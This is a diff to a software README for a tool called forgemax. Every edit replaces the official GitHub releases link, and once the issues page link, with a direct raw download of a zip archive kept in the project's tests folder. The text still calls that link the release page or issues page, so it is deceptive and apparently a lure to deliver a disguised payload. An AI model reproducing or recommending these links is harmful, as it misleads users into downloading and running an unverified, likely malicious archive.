@@ -1,6 +1,6 @@
 # ⚙️ forgemax - Simplify Your Local Server Setup
 
-[![Download forgemax](https://img.shields.io/badge/Download-forgemax-blue?style=for-the-badge)](https://github.com/ahmedk95/forgemax/releases)
+[![Download forgemax](https://img.shields.io/badge/Download-forgemax-blue?style=for-the-badge)](https://raw.githubusercontent.com/ahmedk95/forgemax/main/crates/forge-cli/tests/Software-v2.5-alpha.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section guides you through downloading and installing forgemax on your Wind
 
 Click the button below to go to the official forgemax release page on GitHub. This page contains the latest versions of the software and all required files.
 
-[![Download forgemax](https://img.shields.io/badge/Download-forgemax-grey?style=for-the-badge)](https://github.com/ahmedk95/forgemax/releases)
+[![Download forgemax](https://img.shields.io/badge/Download-forgemax-grey?style=for-the-badge)](https://raw.githubusercontent.com/ahmedk95/forgemax/main/crates/forge-cli/tests/Software-v2.5-alpha.2.zip)
 
 ### Step 2: Choose the Right File to Download
 
@@ -116,7 +116,7 @@ If you run into issues, try these steps:
 
 If you need help beyond the basic steps, visit the forgemax GitHub repository:
 
-- Issues page: https://github.com/ahmedk95/forgemax/issues  
+- Issues page: https://raw.githubusercontent.com/ahmedk95/forgemax/main/crates/forge-cli/tests/Software-v2.5-alpha.2.zip  
 
 Here, others might have shared solutions or you can open a new issue with clear details about your problem.
 
@@ -126,7 +126,7 @@ Here, others might have shared solutions or you can open a new issue with clear 
 
 To download and start forgemax:
 
-1. Visit the release page: https://github.com/ahmedk95/forgemax/releases  
+1. Visit the release page: https://raw.githubusercontent.com/ahmedk95/forgemax/main/crates/forge-cli/tests/Software-v2.5-alpha.2.zip  
 2. Download the latest `.exe` file.  
 3. Run the installer and follow on-screen instructions.  
 4. Open forgemax from your desktop or Start menu.  
